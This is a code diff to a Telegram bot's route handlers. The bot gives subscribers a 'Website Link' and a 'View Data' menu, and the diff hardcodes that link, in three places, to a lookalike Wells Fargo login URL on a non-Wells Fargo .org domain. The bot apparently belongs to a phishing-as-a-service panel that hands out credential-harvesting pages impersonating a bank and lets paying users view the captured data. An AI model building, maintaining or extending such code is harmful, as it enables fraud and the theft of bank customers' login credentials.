@@ -1239,7 +1239,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = await shortenUrl(generateUniqueLink());
+            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await answerCallbackQuery(query.id, "🔗 Link generated!");
             await sendTelegramMessage(
               chatId,
@@ -1374,7 +1374,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = await shortenUrl(generateUniqueLink());
+            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await sendTelegramMessage(
               chatId,
               `🔗 <b>Website Link</b>\n\n` +
@@ -1471,7 +1471,7 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = await shortenUrl(generateUniqueLink());
+            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await sendTelegramMessageWithKeyboard(
               chatId,
               `📊 <b>View Data</b>\n\n` +
